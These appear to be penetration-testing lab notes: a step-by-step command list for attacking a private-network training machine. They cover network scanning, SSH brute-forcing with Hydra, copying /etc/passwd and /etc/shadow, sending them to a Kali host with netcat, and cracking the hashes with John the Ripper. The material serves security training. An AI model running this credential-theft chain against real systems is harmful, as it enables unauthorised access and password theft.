(checklist)

- port scan
- version scan
- service scan

COMMANDS:
Scanning:
  -We start by finding the IP of your machine.
	 arp-scan 192.168.121.0/24
	 nmap 192.168.121.137
	 masscan -e eth0 -p 1-65535 192.168.121.137> masscan.txt
	 nmap -sU --top-ports 100 192.168.121.137 > top-100-udp-ports.txt
	 
Create a user.txt and password.txt that lists common combination:

Bruteforcing SSH using Hydra
	hydra -L user.txt -P password.txt ssh://192.168.121.137 -f
			-L is for the username files
			-P is for password files ssh://<target ip> for the target protocol to crack and the IP address
			-f means stop after it finds a valid credential
			
Login to SSH using the found credentials
	which nc (to check if netcat is installed, if not then install it)
	 save the passwdand the shadowfiles into a text file
		  - cat /etc/passwd > duches-passwd.txt
		  - cat /etc/shadow > duches-shadow.txt
	
Transfer the files using Netcat (main goal is to transfer the files to your kali)
		-In Debian, run the command below.
			nc 192.168.121.131  4444 < duches-passwd.txt
		-In Kali, run the command below to receive the duches-passwd.txt
			nc -lnvp 4444 > duches-passwd.txt
		-Repeat the process with the duches-shadow.txt file
			nc 192.168.121.131  4444 < duches-shadow.txt
			nc -lnvp 4444 > duches-shadow.txt

Run “ unshadow” to merge the two files. Save it as hash.txt
		unshadow duches-passwd.txt  duches-shadow.txt > hash.txt

Run JohnTheRipper to crack the username and password:
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


